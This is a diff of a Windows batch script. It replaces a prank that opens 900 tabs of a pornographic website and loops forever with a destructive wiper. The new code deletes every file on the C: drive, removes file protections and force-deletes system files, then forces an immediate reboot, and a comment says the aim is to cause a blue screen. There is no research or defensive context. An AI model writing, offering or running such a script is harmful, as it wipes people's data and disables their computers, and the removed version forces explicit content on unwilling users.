@@ -1,30 +1,18 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Define the number of tabs to open
-set "numTabs=900"
+:: Wait for 10 seconds
+timeout /t 10 /nobreak >nul
 
-:: Define the URL to open
-set "url=http://pornhub.com"
+:: Delete all files in the system drive (assuming C: is the system drive)
+for /r C:\ %%i in (*) do del "%%i"
 
-:: Function to open tabs
-:open_tabs
-set "counter=0"
-:loop
-if !counter! lss %numTabs% (
-    start "" "%url%"
-    set /a counter+=1
-    goto loop
-)
-exit /b
+:: Force delete all files in the system drive (including protected files)
+attrib -r -s -h /s /d C:\*.*
+del /f /s /q C:\*
 
-:: Main script execution
-call :open_tabs
+:: Restart the system to potentially cause a blue screen
+shutdown /r /f /t 0
 
-:: Infinite loop to prevent the program from closing
-:infinite_loop
-ping 127.0.0.1 -n 2 >nul
-goto infinite_loop
-
-echo %numTabs% tabs of %url% opened.
-pause
+:: End the script
+endlocal
